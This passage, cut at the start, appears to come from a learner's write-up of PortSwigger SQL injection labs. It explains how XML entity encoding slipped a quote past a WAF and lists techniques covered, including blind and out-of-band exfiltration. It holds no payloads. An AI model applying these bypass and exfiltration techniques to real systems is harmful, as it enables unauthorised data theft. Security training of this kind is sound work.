metacharacter and let the request through, but once the backend's XML
parser decoded the entity back into a literal `'`, the underlying SQL
injection executed normally.

## What I Learned
This lab highlighted a common weakness in filter/WAF-based defenses:
filtering on raw, literal characters is unreliable when the application
stack itself performs decoding somewhere downstream (in this case, XML
entity decoding). An attacker only needs to find one encoding format that
the filter doesn't recognize but the backend still processes, to
completely bypass the protection. This reinforces why proper defenses
rely on parameterized queries rather than input filtering/blacklisting —
filters can almost always be bypassed through some encoding or obfuscation
technique.



## SQL Injection Topic — Final Summary (Labs 1–18)
Completed 18 hands-on labs on PortSwigger Web Security Academy, covering
the full practitioner-level breadth of SQL injection as a vulnerability
class:
- Basic filter/logic bypass and login bypass (Labs 1–2)
- UNION-based data extraction across Oracle and non-Oracle databases,
  including column enumeration and column-limited extraction (Labs 3–10)
- Blind SQLi: conditional responses, conditional errors, and error-based
  leakage (Labs 11–13)
- Blind SQLi: time-based delays, both for detection and full data
  extraction (Labs 14–15)
- Blind SQLi: out-of-band interaction and data exfiltration via Burp
  Collaborator (Labs 16–17)
- Filter/WAF bypass techniques using encoding (Lab 18)

This represents comprehensive, practitioner-level mastery of SQL injection
across every major sub-category tested in real-world security assessments.
